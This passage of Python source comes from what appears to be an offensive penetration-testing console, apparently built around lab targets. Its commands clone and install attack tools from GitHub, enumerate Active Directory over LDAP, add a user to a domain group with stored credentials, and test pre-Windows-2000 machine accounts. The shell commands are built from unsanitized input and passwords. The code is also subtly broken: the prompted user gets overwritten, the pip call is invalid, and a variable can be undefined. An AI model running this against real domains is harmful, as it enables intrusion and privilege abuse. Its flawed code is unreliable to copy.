        2. Constructing an LDAP enumeration command with customizable authentication and server details.
        3. Executing `ad-ldap-enum.py` to output detailed information in CSV format.

        The output files are saved in the current working directory with a prepend if specified.

        Example command the function can build:
        - `python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson -v`

        Usage:
            - Run `dp_ad_ldap_enum` to initiate AD object enumeration using ad-ldap-enum.

        :param line: String containing initial command-line arguments or options.
        """
        domain = self.params["domain"]
        rhost = self.params["rhost"]
        ad_ldap_enum_git = "https://github.com/CroweCybersecurity/ad-ldap-enum.git"
        ad_ldap_enum_dir = os.path.join(os.getcwd(), "external/.exploit/ad_ldap_enum")
        ad_enum_script = os.path.join(os.getcwd(), f"{ad_ldap_enum_dir}/ad-ldap-enum.py")

        if not os.path.exists(ad_ldap_enum_dir):
            print_msg("Cloning ad_ldap_enum repository...")
            self.cmd(f"git clone {ad_ldap_enum_git} {ad_ldap_enum_dir}")
            self.cmd(f"cd {ad_ldap_enum_dir} && python3 -m pip3 install -r 'requirements.txt'")
        else:
            print_msg("ad_ldap_enum already installed, skipping setup.")

        if not os.path.exists(f"{os.getcwd()}/sessions/credentials.txt"):
            print_warn("Credentials required. Please provide your username and password.")
            username = self.ask("Enter username: ")
            password = self.ask("Enter password: ")
        else:
            credentials = get_credentials()
            if not credentials:
                return
            username, password = credentials[0]

        command = f"cd sessions && python3 {ad_enum_script} -d {self.params['domain']} -l {self.params['rhost']} -u {username} -p {password} --verbosity EXTENDED"
        print_msg(f"Executing: {command}")
        self.cmd(command)

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_net_rpc_addmem(self, line):
        """
        Executes the net rpc group addmem command to add a user to a specified group in Active Directory.

        This function performs the following actions:
        1. Prompts the user for necessary parameters if not provided.
        2. Executes the command to add a user to a specified group in Active Directory.

        The command accepts the following parameters:
        - Group name to which the user will be added.
        - User to be added to the group.
        - Domain credentials for authentication.
        - DC IP address for the self.params['domain'] controller.

        Parameters:
        line (str): Command argument specifying the user and group options.
                    Expected format:
                        - "GROUP_NAME" for the group name
                        - "$USER" for the user to add
                        - Required flags for authentication and connection

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        user = self.ask("    [!] Enter the user to add (default judith.mader): ", "judith.mader")
        group = self.ask("    [!] Enter the group name (default Management): ", "Management")
        rhost = self.ask(f"    [!] Enter the DC IP address (default {self.params['rhost']}): ", self.params["rhost"])
        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()
        if not credentials:
            return

        for user, passwd in credentials:
            command = f'net rpc group addmem "{group}" "{user}" -U "{self.params["domain"]}/{user}%{passwd}" -S "{self.params["rhost"]}"'
            print_msg(command)
            self.cmd(command)
        return

    @cmd2.with_category("02. Scanning & Enumeration")
    def do_pre2k(self, line):
        """
        Executes the pre2k tool to query the self.params['domain'] for pre-Windows 2000 machine accounts or to pass a list of hostnames to test authentication.

        This function:
            - Installs pre2k if not already installed.
            - Executes the pre2k command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3`, `python3-pip`, and `git` to be installed.
            - Uses parameters from `self.params` for self.params['domain'], username, password, and target.

        Usage:
            pre2k auth -u <username> -p <password> -d <self.params['domain']> -dc-ip <dc_ip>
            pre2k unauth -d <self.params['domain']> -dc-ip <dc_ip> -inputfile <inputfile>
        """
        path = os.getcwd()
        pre2k_repo = "https://github.com/garrettfoster13/pre2k.git"
        pre2k_path = os.path.join(path, "external", ".exploit", "pre2k")

        try:
            if not os.path.exists(pre2k_path):
                print_msg("pre2k is not installed. Installing...")
                self.cmd(f"git clone {pre2k_repo} {pre2k_path}")
                self.cmd(f"cd {pre2k_path} && pip3 install .")

            command_parts = line.split()
            if not command_parts:
                print_error("No command specified. Use 'auth' or 'unauth'.")
                return

            command = command_parts[0]
            if command == "auth":
                credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
                if not os.path.exists(credentials_path):
                    username = self.params.get("username") or self.ask("    [!] Enter the username: ")
                    password = self.params.get("password") or self.ask("    [!] Enter the password: ")
                else:
                    credentials_path = get_users_dic("txt")
                    with open(credentials_path) as f:
                        credentials = f.read().strip().split("\n")
                        if credentials:
                            username, password = credentials[0].split(":")
                        else:
                            username = self.params.get("username") or self.ask("    [!] Enter the username: ")
                            password = self.params.get("password") or self.ask("    [!] Enter the password: ")
                        domain = self.params["domain"]
                        dc_ip = self.params["rhost"]

                if not self.params["domain"]:
                    print_error("Domain not defined.")
                    domain = self.ask("    [!] Enter the self.params['domain']: ")

                if not dc_ip:
                    print_error("Domain controller IP not defined.")
                    dc_ip = self.ask("    [!] Enter the self.params['domain'] controller IP: ")

                command = f"cd {pre2k_path} && pre2k auth -u {username} -p {password} -d {self.params['domain']} -dc-ip {dc_ip}"

            elif command == "unauth":
                domain = self.params["domain"]
                dc_ip = self.params["rhost"]

                if not self.params["domain"]:
                    print_error("Domain not defined.")
                    domain = self.ask("    [!] Enter the self.params['domain']: ")

                if not dc_ip:
                    print_error("Domain controller IP not defined.")
                    dc_ip = self.ask("    [!] Enter the self.params['domain'] controller IP: ")

                input_file = get_users_dic("txt")

                if input_file is None:
                    input_file = f"{path}/sessions/users.txt"

                if not input_file:
                    print_error("Input file not defined.")
                    input_file = self.ask("    [!] Enter the input file path: ")

                command = f"cd {pre2k_path} && pre2k unauth -d {self.params['domain']} -dc-ip {dc_ip} -save -inputfile {input_file} -outputfile {path}/sessions/pre2k_{dc_ip}.txt"

            else:
                print_error("Invalid command. Use 'auth' or 'unauth'.")
                return

            self.cmd(command)

        except Exception as e:
            print_error(f"Error: {e}")

